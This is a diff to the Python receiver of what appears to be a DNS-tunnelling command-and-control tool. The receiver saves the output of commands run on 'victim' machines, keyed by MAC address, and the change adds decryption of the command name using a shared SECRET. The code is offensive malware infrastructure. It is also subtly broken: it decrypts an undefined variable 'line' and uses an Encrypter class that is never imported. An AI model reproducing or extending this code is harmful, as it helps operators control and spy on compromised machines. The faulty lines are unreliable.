@@ -10,7 +10,7 @@ from operator import attrgetter
 from utils.request_type import RequestType
 from utils.data_req_type import DataRequestType
 from utils.mac import Mac
-from utils.consts import log, PacketData, BROADCAST_MAC
+from utils.consts import log, PacketData, BROADCAST_MAC, SECRET
 from command.cmdparser import CommandParser
 
 class DataReceiver():
@@ -132,7 +132,8 @@ class DataReceiver():
         timestamp = datetime.now().isoformat()
         with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
             dnsrr_layer = pkt.getlayer(DNSRR)
-            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
+            command = dnsrr_layer.rrname[:-1]
+            f.write(Encrypter(line, SECRET).decrypt() + '\n') # Command associated with output
             f.write(dnsrr_layer.rdata)
 
     def _handle_data_pkts(self, pkt, dns_layer, dnsqr_layer, filename, key, victim_mac):
